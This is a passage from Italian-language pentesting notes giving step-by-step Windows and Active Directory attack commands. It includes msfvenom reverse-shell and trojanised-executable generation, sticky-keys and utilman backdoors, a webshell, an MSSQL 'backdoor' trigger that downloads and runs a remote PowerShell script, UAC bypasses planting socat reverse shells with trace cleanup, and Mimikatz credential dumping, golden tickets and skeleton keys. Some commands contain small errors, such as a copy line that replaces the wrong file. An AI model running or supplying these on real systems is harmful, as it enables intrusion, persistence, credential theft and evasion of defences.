_WinLogon sfrutta delle chiavi di registro alla path __"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"__, e due sono i value interessanti __"UserInit"__ che ha il compito di caricare le preferenze dell'utente e __"Shell"__ che nella maggior parte dei casi punta a explorer.exe; aggiungendo una semplice virgola a __"Shell"__ possiamo fare in modo di avviare un nostro eseguibile_

_Comandi:_
<!-- -->
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
<!-- -->
       regedit -> HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit-> explore.exe, <path del nostro eseguibile> #passi per modificare la 
       chiave shell
<!-- -->
_Altro metodo di persistenza quando si esegue il logon è andare alla seguente path __"HKCU\Environment"__ e creare una nostra variabile d'ambiente di nome __"UserInitMprLogonScript"__ che punti al nostro eseguibili e ogni volta che avviene un logon si avvierà._

- __Tasti Permanenti:__

_Quando viene premuto rapidamente per 5 volte di seguito il tasto SHIFT, windows aprirà un'eseguibile di nome __"setch.exe"__, sostitunedolo avremmo la possibilità di eseguire un nostro eseguibile anche prima della schermata di login._

_Comandi:_
<!-- -->
      takeown /f C:\Windows\System32\sethc.exe #comando per prendere il controllo dell'eseguibile
<!-- -->
      icacls C:\Windows\System32\sethc.exe /grant Administrator:F #comando per darsi i permessi sull'eseguibile
<!-- -->
      copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe #sostituzione dell'eseguibile con un CMD di user SYSTEM
<!-- -->
- __Utilman:__

_Utilman è un'eseguibile che fornisce delle opzioni di accesso semplificato prima del login, anche in questo caso avendo i giusti permessi, possiamo sostituire l'eseguibile __"utilman.exe"__ con un __"cmd.exe"___

_Comandi:_
<!-- -->
      takeown /f C:\Windows\System32\utilman.exe #comando per prendere il controllo dell'eseguibile
<!-- -->
      icacls C:\Windows\System32\utilman.exe /grant Administrator:F #comando per darsi i permessi sull'eseguibile
<!-- -->
      copy c:\Windows\System32\utilman.exe C:\Windows\System32\sethc.exe #sostituzione dell'eseguibile con un CMD di user SYSTEM
<!-- -->
- __IIS:__

_Inserendeo una webshell all'interno della root del server IIS potremmo loggare come utente del servizio con i relativi privileggi annessi, tra cui uno molto importante [SeImpersonatePrivilege](./#misconfiguration-di-vario-tipo)_

_Comandi:_
<!-- -->
      move <nome webshell>.aspx C:\inetpub\wwwroot\ #comando per copiare la webshell nella root dell'IIS
<!-- -->
      icacls <nome webshell>.aspx /grant Everyone:F #comando per darsi il controllo totale sulla webshell
<!-- -->
      http://<ip target/<nome webshell>.aspx #Url per visitare e attivare la webshell
<!-- -->
- __Mysql:__

_Mysql è presente in molti sistemi e può essere utilizzato per i nostri scopi_

_Comandi:_
<!-- -->
      Microsoft SQL Server Management Studio-> accesso con le credenziali dell'user-> nuova query #passi per fare una query
<!-- -->      
_Query:_
<!-- -->
      sp_configure 'Show Advanced Options',1;
      RECONFIGURE;
      GO #query che attiva le opzioni avanzate
<!-- -->      
      sp_configure 'xp_cmdshell',1;
      RECONFIGURE;
      GO #query che avvia la xp_cmdshell
<!-- -->        
      USE master
      
      GRANT IMPERSONATE ON LOGIN::<nome account admin> to [Public]; #comando che da i privilegi a tutti gli utenti, impersonandosi come admin del DB
<!-- --> 
      USE HRDB #utilizzo del DB HRDB

      CREATE TRIGGER [backdoor]
      ON HRDB.dbo.Employees 
      FOR INSERT AS
      
      EXECUTE AS LOGIN = 'sa'
      EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ip>:<porta>/<script>.ps1'')"';
      #query che crea un trigger che si connette ad uno nostro webserver e scarica il nostro script.ps1
<!-- -->    
- __Certificati:__

_la spiegazioni sui certificati la si trova [qui](./#certificati-ad)_

_Comandi:_
<!-- -->
      certutil -v -template #comando per listare i template
<!-- -->      
_caratteristiche dei template che interessano a noi:_

 1) template con i permessi di poter richiedere un certificato quali Allow Enroll o Allow Full Control
<!-- -->
        #Lo si trova greppando per ogni parola di Allow Enroll o Allow Full Control per poi vedere se il gruppo che ha questi privilegi è il gruppo in cui poi apperteniamo anche noi
<!-- -->
 2) template che permetta l'autenticazione del client che verrà in seguito utilizzata per l'autenticazione al kerberos
<!-- -->
        #per trovarlo bisogna andare a vedere le proprietà della voce EKU e trovare la parola Client Authentication
<!-- -->
 3) template che permette di alterare il SAN (subject alternative name)
<!-- -->
        #Lo si trova greppando per CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, se settato a 1 possiamo modificare il SAN
<!-- -->
_Un template avendo le 3 caratteristiche elencate sopra potrà essere utilizzato a nostro vanataggio_

_Viene inserito sia il metodo con GUI e tramite tools su CLI:_

- __Metodo GUI:__
<!-- -->
     mmc #comando per aprire microfsoft management console
<!-- -->
     File-> aggiungi/rimuovi snap-in-> Certificati-> selezioniamo il mio account utente #passi per creare un certificato generale
<!-- -->
__N.B: senza privileggi possiamo selezionare account utente e non account servizi o account computer quando creiamo il certificato generale__
<!-- -->
     Console Root-> Certificati-> Personale-> tutte le attività-> richiedi nuovo certificato-> avanti-> scritta blu maggiori informazioni sono richieste->     
     #passi per creare il certificato personalizzato
<!-- -->
     #ora va inserito l'UPN dell'user che vogliamo impersonare nel campo SAN
<!-- -->
     Get-ADUser | fl * #comando per trovare gli user con UPN annesso se presente
<!-- -->
     #invece nel campo nome soggetto va cambiato con nome comune
<!-- -->
     Ok-> Enroll-> ora il certificato sarà pronto e deve essere esportato-> click destro sul certificato-> tutte le attività-> esporta-> selezionare si per   
     esportare la chiave privata -> configurare una password -> avanti e verrà esportato #passi per salvare ed esportare il certificato con la relativa chiave 
     privata
<!-- -->
__Esportare il certificato con chiave privata annessa è possibile anche con [Mimikatz](./#mimikatz)__

_Ora non dobbiamo fare altro che prenderci il kerberos ticket_

link per scaricare [rubeus](https://github.com/GhostPack/Rubeus)
<!-- -->
     Rubeus.exe asktgt /user:<nome utente che deve coincidere con quello dell'UPN> /enctype:aes256 /certificate:<path del certificato> /password:<password 
     certificato> /outfile:<file dove verrà salvato il TGT> /domain:<dominio> /dc:<ip> #comando per richiedere il TGT tramite il nostro certificato
<!-- -->
     Rubeus.exe changepw /ticket:<path al file TGT> /new:<nuova password> /dc:<dominio> /targetuser:<dominio>\<user> #comando per cambiare password dell'account 
     che vogliamo attaccare
<!-- -->
_Comandi per creare il certificato da CMD con il tool [ForgeCert](https://github.com/GhostPack/ForgeCert)_
<!-- -->
     ForgeCert.exe --CaCertPath <certificato esportato>.pfx --CaCertPassword <password> --Subject CN=<nome> --SubjectAltName <UPN> --NewCertPath <path o nome dove 
     salvare il file>.pfx --NewCertPassword <nuova password> #comando per creare il nostro certificato
<!-- -->
- __Metodo CLI:__

_Verifichiamo per eventuali vulnerabilità nei certificati_
<!-- -->
     .\Certify.exe find /vulnerable #comando per cercare vulnerabilità
<!-- -->
     .\Certify.exe request /ca:<dominio CA> /template:UserCert /altname:<nome utente> #comando per ottenere certificato con chiave privata
<!-- -->
_Copiare chiave privata e certificato in file chiamato __"cert.pem"___
<!-- -->
     sed -i 's/\s\s+/\n/g' cert.pem #comando per formattare per bene il cert.pem
<!-- -->
     openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
     aggiungere una password per esportare
     #comandi per creare il certificato in formato PFX
<!-- -->
_Ora va importato nella target machine e tramite [rubeus](https://github.com/GhostPack/Rubeus) richiediamo il TGT_
<!-- -->
     Rubeus.exe asktgt /user:<nome utente che deve coincidere con quello dell'UPN> /enctype:aes256 /certificate:<path del certificato> /password:<password 
     certificato> /outfile:<file dove verrà salvato il TGT> /domain:<dominio> /dc:<ip> #comando per richiedere il TGT tramite il nostro certificato
<!-- -->

### Tools:

_Tool utile per l'audit dei certificati scaricabile [qua](https://github.com/GhostPack/PSPKIAudit)_

##### Metasploit:

_Metasploit è un framework molto utilizzato nel mondo del pentesting, in quanto al suo interno si possono trovare numerosi exploit, vulnerabilità e payload; metasploit dispone dei moduli, che possono essere di diverse tipologie:_

1) Auxiliary = moudulo di supporto dove troviamo crawler, scanner, listener e revshell

2) Exploits = modulo contenente gli exploits

3) Post = modulo utilizzato per la post-exploitation

4) Encoders = modulo che permette di encodare il proprio payload

5) Payload = modulo contente vari payload

_Nel modulo payload poi abbiamo delle sottocategorie:_ 

- Adapters = adatta un payload in differenti formati tipo in un bash command

- Stageless = Payload che runna nel computer vittima da sola, cioè senza componenti ulteriori da scaricare (__"_"__ è indicato con l'underscore __"msfvenom -p windows/x64/meterpreter_reverse_tcp__")

- Staged = Payload che prima viene runnato nel computer vittima e che poi deve scaricare il resto del payload detto __"Stage"__ (__"/"__ è indicato __"msfvenom -p windows/x64/meterpreter/reverse_tcp__")

- _Comandi Msfconsole:_
<!-- -->
     history #comando per vedere l'history dei comandi
<!-- -->
     show #comando per listare i moduli
<!-- -->
     search <nome generico o path specifica> #comando per ricercare in un modulo 
<!-- -->
ES: `search exploit/unix/webapp/moinmoin_twikidraw o search moinmoin`
<!-- -->
     use <path modulo o num della lista> #comando per utilizzare un modulo specifico
<!-- -->
ES: `use exploit/unix/webapp/moinmoin_twikidraw o use 1`
<!-- -->
     info #comando che da informazioni sull'modulo selezionato
<!-- -->
     show options #comando per vedere le opzioni da inserire nell'modulo da utilizzare
<!-- -->
     set <nome opzione> <valore opzione> #comando per settare l'opzione di un modulo selezionato
<!-- -->
ES: `set RHOSTS 1.1.1.1`
<!-- -->
     unset all #comando per svuotare le varie opzioni settate
<!-- -->
     back #comando per uscire dall'modulo selezionato e tornare alla msfconsole
<!-- -->
     exploit o run #comandi per avviare l'exploit o il modulo selezionato
<!-- -->
- _Comandi Meterpreter:_
<!-- -->
     background #comando che una volta stabilita una sessione la manda in background permettendoci di svolgere altre operazioni
<!-- -->
     sessions -i <num sessione> #comando per riprendere ad utilizzare una sessione in background
<!-- -->
     ps #comando per listare i processi sulla target machine
<!-- -->
     getuid #comando per sapere che user siamo
<!-- -->
     keyscan_start keyscan_dump keyscan_stop #comandi per iniziare, scaricare il dump e fermare il keylogger in metasploit
<!-- -->
     shell #comando per avviare una shell
<!-- -->
     load kiwi #comando per avviare mimikatz
<!-- -->
- _Comandi Payload:_
<!-- -->   
      msfvenom -a x64 -p windows/x64/exec CMD='<comando cmd>' -f <linguaggio> #comando per generare un payload che esegue un solo comando cmd
<!-- -->
      msfvenom -a x86 --platform Windows LHOST=<ip> LPORT=<porta> -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '<byte da escludere>' -i <num 
      iterazionie> -f <linguaggio> #comando che genera una revshell con obfuscazione
<!-- -->
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<porta> -f exe --encrypt xor --encrypt-key "<chiave>" -o <nome eseguibile>.exe
      #comando per generare una revshell criptata
<!-- -->      
      msfvenom -x <nome eseguibile falso>.exe -k -p windows/shell_reverse_tcp lhost=<ip> lport=<porta> -f exe -o <nome eseguibile>.exe
      #comando che genera una revshell all'interno di un finto eseguibile
<!-- -->
- _Comandi Reverse/Port forwarding e pivoting:_

_Viene scritta una piccola sezione per questi comandi perchè in particolare sono ricollegabili alla sezione di [Port Forwarding](./#port-forwarding)_
<!-- -->
      use auxiliary/server/socks_proxy #comando che usa il modulo socks_proxy
      set SRVPORT 9050 #campo per indicare la porta 
      set SRVHOST 0.0.0.0 #campo per indicare indirizzo ip 
      set version 4a #campo che indica la versione
      run #comando per avviare il modulo
<!-- -->      
__N.B: Prestare attenzione alla versione selezionata nel modulo socks_proxy deve coincidere con quella nel file /etc/proxychains.conf__
<!-- -->
      use post/multi/manage/autoroute #comando che avvia il modulo autorute, per impostare le route
      set sesssions 1 #campo che indica la sessione da utilizzare
      set SUBNET <ip> #campo che indica la subnet 
      run #comando per avviare il modulo
<!-- -->
      run autoroute -s <ip route> #comando alternativo per aggiungere manualmente una route, lanciato da meterpreter
      run autoroute -p #comando che lista la routing table, lanciato da meterpreter
<!-- -->
      help portfwd #comando che runnato in msfoconsole apre l'help per il portfwd
      portfwd add -l <porta locale> -p <porta remote> -r <ip remoto> #comando che binda la porta locale a quella remota, lanciato da meterpreter
      portfwd add -R -l <porta locale> -p <porta remota> -L <ip remoto> #comando utilizzato per una reverse shell via port forwarding e binda la porta locale a quella, lanciato da 
      meterpreter 
      remota poi una volta attivata la revshell che andrà a puntare prima alla porta remota che poi tramite forward arriverà alla nostra macchina, lanciato da meterpreter
<!-- -->
ES: 
`portfwd add -l 3300 -p 3389 -r 192.168.9.1`
<!-- -->
`freerdp /v:localhost:3300 /u:user /p:password`
<!-- -->
_Ulteriore sottosezione con dei moduli utili per il pivoting e la scansione delle reti_
<!-- -->
      run post/multi/gather/ping_sweep RHOSTS=<ip> #comando utile per la scansione di host tramite il comando ping, lanciato da meterpreter
<!-- -->
ES: `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24`

__N.B: Prestare attenzione ai bit dedicati agli utenti nella subnet__
<!-- -->
##### Powerview

_Scaricare PowerView.ps1 sulla macchina e avviarlo:_
<!-- -->
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
<!-- -->

_dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:_
<!-- -->
    Get-NetUser #ottiene le informazioni sugli utenti
<!-- -->
    Get-NetUser | select cn #per ottenere solo il common name
<!-- -->
    Get-NetUser -TrustedToAuth #comando per ottenere l'utenti che possono autenticarsi tramite trust o delegation
<!-- -->
    Get-NetGroup #ottiene tutti i gruppi presenti a dominio
<!-- -->
    Get-NetGroup -GroupName *admin* #ottiene tutti i gruppi in cui è presente la parola admin
<!-- -->
    Invoke-ShareFinder #ottiene tutte le shares smb del dominio
<!-- -->
    Get-NetComputer -FullData #ottiene tutte le informazioni su tutti i pc della rete
<!-- -->
    Get-NetComputer -FullData | Select-Object logoncount #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi 
<!-- -->
    Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose 
    #comando per aggiungere un oggetto alle ACL
<!-- -->
_Sopra vengono riportati i comandi utilizzati più di frequente, per una visione più completa dei comandi andare [qui](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)._

##### Bloodhund:

__Bloodhound è un tool che permette l'organizazione delle informazioni ottenute dalla fase di recognition del'AD__

__Abbiamo bisogno di due tools: bloodhound e neo4j (che farà da database per bloodhound)__
<!-- -->
      sudo apt install neo4j && sudo apt install bloodhound #comando per installarli
<!-- -->
      neo4j console #apriamo la console di neo4j per startare il db
<!-- -->
_Dobbiamo navigare sull'interfaccia web di neo4j per loggare e cambiare la password di default.
Cerchiamo perciò http://localhost:7474/ e logghiamo con le credenziali di default (neo4j:neo4j)
e inseriamo la nostra nuova password._

_Avviamo adesso bloodhound:_
<!-- -->
      bloodhound
<!-- -->
_sulla macchina vittima (windows a dominio) su cui abbiamo RCE eseguiamo questo comando
(lo script powershell deve essere ovviamente già sulla macchina)_
<!-- -->
      . .\SharpHound.ps1
      Invoke-BloodHound -CollectionMethod All -OutputDirectory "<Path della cartella dove salvare lo zip>"
<!-- -->
_adesso scarichiamo il file sulla nostra macchina;
una volta fatto questo andiamo sull'interfaccia grafica di bloodhound e importiamo il file strisciandocelo sopra oppure selezionando l'icona importa mappa._

__N.B: Bloodhund entra nel vivo dando una visione d'insieme dell'AD target un campo dove può essere utilizzato è per le [DACL attacks](./#dacl-attacks)__

##### Mimikatz:
_Mimikatz è utilizzato per recuperare hash, password, recupero e creazione di ticket kerberos, per scaricalo andare [qui](https://github.com/ParrotSec/mimikatz)._

__Consigliamo di utilizzare mimikatz integrato con meterpreter per una maggiore praticità.__

__N.B: Alcuni di questi comandi richiedono che venga disattivato LSA del LSASS.__

Commandi:
<!-- -->
      privilege::debug #comando per assicurarsi di runnare mimikatz come amministratore
 <!-- -->
      token::elevate #comando che tenta di elevare i privilegi
<!-- -->
      lsadump::lsa /patch #comando per recupere NTLM hash
<!-- -->
      lsadump::sam #comando che tenta il dump del SAM
<!-- -->
      lsadump::dcsync /domain:<nome dominio> /all #comadno che esegue il dcsync attack su tutti gli utenti
<!-- -->
      sekurlsa::logonpasswords #comando che tenta di recuperare le password in cache
<!-- -->
      sekurlsa::credman #comando che tenta di recuperare le password dal credmanager
<!-- -->
      sekurlsa::tickets /export #comando per esportare i .kirbi tickets e li recupera da LSASS memoria
<!-- -->
      sekurlsa::ekeys #comando che tenta di recuperare le kerberos keys e le password annesse
<!-- -->
      sekurlsa::minidump lsass.dmp #comando che se abbiamo la possibilità di dumpare LSASS permette di recuperare le password da esso
<!-- -->
      misc::cmd #comaneo per aprire un cmd 
<!-- -->
      kerberos::ptt <ticket> #comando per fare il pass the ticket
<!-- -->   
      log <nome file>.txt #comando per creare un file di log
<!-- -->   
_Golden ticket si ha accesso a tutti i servizi del kerberos._
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid utente> /krbtgt:<NTLM utente> /id:<id utente> #comando per creare un golden ticket
<!-- -->
      kerberos::golden /admin:<nome admin> /domain:<dominio> /id:<id> /sid:<sid utente> /krbtgt:<NTLM hash> /endin:<minuti durata del ticket>      
      /renewmax:<minuti per il rinnovo del ticket> /ptt #comando che crea sempre un golden ticket ma più completo di varie opzioni
<!-- -->
_Silver ticket si ha accesso ad un servizio del kerberos è più silensiozo del golden._
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid servizio> /krbtgt:<NTLM servizio> /id:<id servizio> #comando per creare un silver ticket
<!-- -->
      kerberos::golden /admin:<nome admin> /domain:<dominio> /id:<id> /sid:<sid servizio> /target:<hostname del dominio> /rc4:>NTLM hash> /service:<servizio> esempio CIFS /ptt #comando che crea sempre un 	 
      silver ticket ma più completo di varie opzioni
<!-- -->
_Comandi per creare la skeleton key_
<!-- -->  
      !+ #comando mimikatz che importa mimidrv.sys
<!-- -->    
      !processprotect /process:lsass.exe /remove #comando per disattivare la protezione del LSA
<!-- -->    
      misc::skeleton #comando per creare la skeleton key
<!-- -->    
      !- #comando per rimuovere mimidrv.sys
<!-- -->    
_Comandi per i [certificati AD](./#certificati-ad)_
<!-- -->   
      crypto::certificates /systemstore:local_machine #comando per la verifica di certificati nella local machine
<!-- -->   
      crypto::capi #comando che utilizza la API CryptoAPI per delle modifiche
<!-- -->   
      crypto::cng #comando che modifica il KeyIso di windows
<!-- -->   
      crypto::certificates /systemstore:local_machine /export #comando per esportare il certificato
<!-- -->   
##### Suite impacket:
_in questa sezione vengono spiegati cosa e come funzionano i vari tool della suite Impacket._
<!-- -->
      impacket-GetUserSPNs #sfrutta la vulnerabilita di kerberoasting per ottenere gli SPN(Service Principal Name) dei vari servizi
<!-- -->
ES:

`impacket-GetUserSPNs -dc-ip <ip> <dominio>/<utente>`

`impacket-GetUserSPNs.py -dc-ip <ip> <dominio>/<utente>_ -request-user <utente>` 
<!-- -->
      impacket-GetNPUsers  #sfrutta la misconfigurazione di utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH del kerberos cioè autenticarsi senza richiedere la password
<!-- -->
ES:_`impacket-GetNPUsers <nome_dominio>\<nome_account> -no-pass`_
<!-- -->
      impacket-secretsdump #recupera NTDS.DIt, SAM hashes locali
<!-- -->
ES:

`impacket-secretsdump -dc-ip <ip_del_domain_controller> <nome_account>:<passoword>@<ip_domain_controller>`

`impacketsecretsdump.py -sam sam.bak -system system.bak LOCAL`

`impacket-secretsdump -just-dc <dominio>/<utente>@<ip>`
<!-- -->     
      impacket-ntlmrelayx #ruba le credenziali NTLM quando vengono inviate tra utenti
<!-- -->
ES: `impacket-ntlmrelayx -6 -t ldaps://<ip_target> -wh wpad.<dominio> -l <directory_dove_salvare>`
<!-- -->
      impacket-addcomputer #comando per aggiungere un computer a dominio
<!-- -->
ES: `impacket-addcomputer -dc-ip <domain_controller_ip> -computer-name <nome_computer> -computer-pass '<password>' '<nome_tdl_dominio>>:<username>:<password>`
<!-- -->
      impacket-smbserver #comando per startar un smb server
<!-- -->
ES: `impacket-smbserver <Nome_share_da_inserire_nel_comando_di_upload> -smb2support <share_locale_che_condividi>`
<!-- -->
      impacket-mssqlclient #comando per connettersi ad un db
<!-- -->      
ES: 

`impacket-mssqlclient <nome utente sql>@<ip> -windows-auth `

`enable xp_cmdshell`

`xp_cmdshell whoami /priv`
<!-- -->       
### DACL attacks:
_viene riportata una piccola lista/metodologia di attacchi alla discretionary access list, piccola perchè sono molteplici le ACE che possono essere sfruttate:_

##### AddMember:
_AddMember viene utilizzato per aggiungere membri ad un gruppo e può essere utilizzato per un [Privilege escalation](./#privilege-escalation) più complesso_

_Comandi:_
<!-- -->
     Add-ADGroupMember "<nome gruppo>" -Members "<nome utente>" #comando per aggiungere ad un gruppo il membro specificato
<!-- -->
     Get-ADGroupMember -Identity "<nome gruppo>" #comando per vedere i membri al gruppo
<!-- -->
##### WriteDACL
_Viene sfruttata il privilegio di poter editare la DACL, crei un user, lo aggiungiamo ai gruppi __"Remote Management Users"__ per controllare l'utente a distanza, al gruppo
__"Exchange Windows Permissions"__ gruppo dell'Active Directory che permette di modificare i permessi di dominio, infine importiamo powerView e tramite il comando __"Add-DomainObjectAcl"__ con __"-rights"__ DCSync potremmo dumpare tutti gli hash di dominio con secretsdump._
<!-- -->
       New-LocalUser <nome_account> -Password (echo "<password>" | convertTo-SecureString -AsPlainText -force) -FullName "<nome_completo>" -Description "<descrizione>"
<!---->
      Add-localGroupMember -Group "Remote Management Users" -member tester4
<!-- -->
      Add-localGroupMember -Group "Exchange Windows Permissions" -Member <nome_utente>
<!-- -->
_Questo comando aggiunge un ACL oggetto all'ACL list per un utente a dominio con diritti DSync che permettono di dumpare tutti gli hash a dominio:_
<!-- -->
      Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose
<!-- -->
##### ForceChangePassword:
_ACE che ci permette di modificare la password dell'user corrente senza la necessità di dover conoscere la password vecchia_

_Comandi:_
<!-- -->
     $Password = ConvertTo-SecureString "<password>" -AsPlainText -Force 
     Set-ADAccountPassword -Identity "<nome utente>" -Reset -NewPassword $Password #comandi per settare una nuova password
<!-- -->
##### GenericAll:
_ACE che ci permette il controllo totale sull'oggetto, possiamo cambiare password, aggiungere SPN ecc..._

_Comandi:_
<!-- -->
     Add-ADGroupMember -Identity "<nome gruppo>" -Members <nome membro> #comando per aggiungere utente ad un gruppo 
     $Password = ConvertTo-SecureString "<password>" -AsPlainText -Force 
     Set-ADAccountPassword -Identity "<nome utente>" -Reset -NewPassword $Password #comandi per settare una nuova password
<!-- -->
##### WriteOwner:

_Ace che permette di poter cambiare l'owner di un oggetto_

_Comandi:_
<!-- -->
     Set-DomainObjectOwner -Identity <SID gruppo> -OwnerIdentity "<nome utente>" -Verbose #comando per cambiare proprietario
<!-- -->
##### GenericWrite:

_ACE che permette di modificare campi non sicuri di un oggetto tipo il parametro ScriptPath_

### Bypass

##### Bypass UAC

__Per sapere cos'è l'UAC e come funziona andare [qui](./#uac)__

_Nella seguente sezione vengono allegati dei casi di compromissione per far capire meglio la logica dietro al bypass e come funziona l'UAC_

- __Caso di compromissione GUI:__

1) msconfig.exe: 

_cliccando tasto windows+R, scrivendo e aprendo msconfig e infine aprendo __processhacker__ potremmo notare che msconfig runna con un high token, grazie alla sua autoelevation apre direttamente il programma con i più alti privilegi e se andiamo nella sezione __tools__ del programma, cerchiamo command prompt potremmo ottenere una shell con permessi elevati._

2) azman.msc __(vecchia utility winserver 2003 utilizzata per gestire i permessi)__:

_aprendo esegui, avviando azman.msc anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __"help o ?"__ cliccando su guida e poi continuando con un click destro e selezionando __"HTML o source code"__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._ 

3) mmc.exe:

_Funziona anche con mmc.exe anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __"help o ?"__ cliccando su guida e poi continuando con un click destro e selezionando __"HTML o source code"__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._

- __Caso di compromissione AutoElevation:__

1) fodhelper __(executable di windows per le lingue)__:

_Avviando possiamo notare che avrà un IL high, usando procmon.exe possiamo osservare che il sistema operativo va a ricercare quale software utilizzare per aprire fodhelper questo perchè nei sistemi operativi Windows esiste il ProgID cioè ad un'estensione è associata un programma di default ed è specificato in genere all'interno della chiave HKEY_CLASSES_ROOT che è un'insieme delle chiavi (HKCU e HKEY).
Nell'exploit possiamo notare che nella HKCU, più precisamente nella subykey con questo path __"shell/open/command"__ è dove viene anche specificato il ProgID possiamo bypassare la system wide association(data un estensione tipo .txt, utilizziamo programma/i di default) andando ad inserire una revshell nella subkey, cosi facendo otteremo una shell privilegiata perchè lo stessto programma è avviato con IL high:_
__N.B: è importante almeno essere nel gruppo amministratori per poter editare i registri.__

Commandi:
<!-- -->
      net user <nome utente> | find "Local Group" #comando per vedere il gruppo di appartenenza 
<!-- -->
      whoami /groups | find "Label" #comando per capire il proprio IL
<!-- -->
      set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command #settare una variabile d'ambiente con il path specificato 
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<porta> EXEC:cmd.exe,pipes" #comando che crea una variabile d'ambiente che crea al suo interno un socat per la revshell
<!-- -->
      reg add %REG_KEY% /v "DelegateExecute" /d "" /f #viene aggiunta la chiave di registro.
      /v #specifica il nome 
      /d #i dati all'interno
      /f #force per evitare ogni prompt di conferma
<!-- -->
      reg add %REG_KEY% /d %CMD% /f #comando per inserire la revshell
<!-- -->
      nc -lnvp <port> #comando per aprire listener sulla nostra macchine
<!-- -->
      fodhelper.exe #comando per avviare l'eseguibile
<!-- -->
      reg delete HKCU\Software\Classes\ms-settings\ /f #comando per eliminare e quindi pulire le tracce
<!-- -->
_Dopo aver fatto tutti i comandi ed infine avviato l'eseguibile e se avremmo anche aperto un listener dovremmo ottenere la revshell con un IL high._

2) fodhelper con AV attivo:

_abbiamo l'AV attivo bene per bypassare l'antivirus viene messa appunto una strategia efficare tramite l'utilizzo di Curver entry(Curver entry è utilizzato quando si hanno più istanze di uno stesso software ma di diverse versioni, curver permette a Windows di utilizzare la versione di default)._

Commandi:
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes" #comando per la revshell
<!-- -->
      reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f #creiamo la subkey .thm con all'interno la revshell
<!-- -->
      reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f #creiamo la subkey curver che punta alla subkey .thm contenente la revshell
<!-- -->
      nc -lnvp <port> #creiamo il listener
<!-- -->
      fodhelper.exe #startiamo l'eseguibile
<!-- -->
Abbiamo ottenuto la revshell con IL high anche se attivo l'antivirus

Possono sorgere dei problemi se nelle UAC settings è attiva l'opzione Always Notify perchè ogni modifica deve essere autorizzata esempio l'exploit di fodhelper
però c'è ancora un modo per bypassare UAC è tramite gli scheduler task, che sono avviati da utenti normali ma eseguiti con privilegi d' amministratore e il tampering di variabili d'ambiente.


- __Bypass tramite scheduler:__

1) DiskCleanup:

_Andando a visionare lo scheduler task e cercano il DiskCleanup possiamo notare che ogni utente può utilizzarlo e verrà eseguito con privilegi di amministratore
N.B (la voce __"Run with highest privileges"__  eredita IL da chi lo avvia quindi da un'utente non-admin avrà IL medium).
Andando poi nella sezione __"Actions"__ possiamo notare che runna il programma tramite comando CMD e fin qui tutto normale, tranne per le variabili d'ambiente che possono essere modificate a nostro vantaggio._

Comandi:
<!-- -->
      reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes &REM" /f
      #crea una subkey con nome windir che simula la variabile d'ambiente %windir% e che poi ha al suo interno una revshell il $REM serve a commentare il resto
<!-- -->
      nc -lnvp <port> #comando per il listener
<!-- -->
      schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I #avvia il task con la revshell 
<!-- -->
      reg delete "HKCU\Environment" /v "windir" /f #comando per eliminare la subkey creata in precendenza
<!-- -->

- __Comandi Generali:__
<!-- -->
      REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA #comando per sapere se attivo UAC
<!-- -->
      REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin #comando per sapere il livello di UAC
<!-- -->
      [environment]::OSVersion.Version #comando per capire la build di windows
<!-- -->
_Il comando per capire la build è importante, in quanto molte di esse sono affette da un UAC bypass, dopo aver visionata la build va visionata [questa pagina](https://en.wikipedia.org/wiki/Windows_10_version_history)(Cross-Reference di windows 10 ma esiste anche di windows 11) per capire la release, dopo aver visionato la release consiglio questa [repo](https://github.com/hfiref0x/UACME)(cliccare la voce "keys") che contiene molti bypass da poter utilizzare_

##### Bypass AMSI:

_Lascio qui il [link](./#amsi) dove viene spiegato cos'è l'AMSI_

- __Powershell Downgrade:__

_Il powershell downgrade consiste nel passare a una versione meno recente di powershell per evitare quelle features di sicurezza introdotte nella versioni più recenti._

__N.B: Le feature sono state introdotte nella versione 5.0 di powershell__

_Comandi:_
<!-- -->
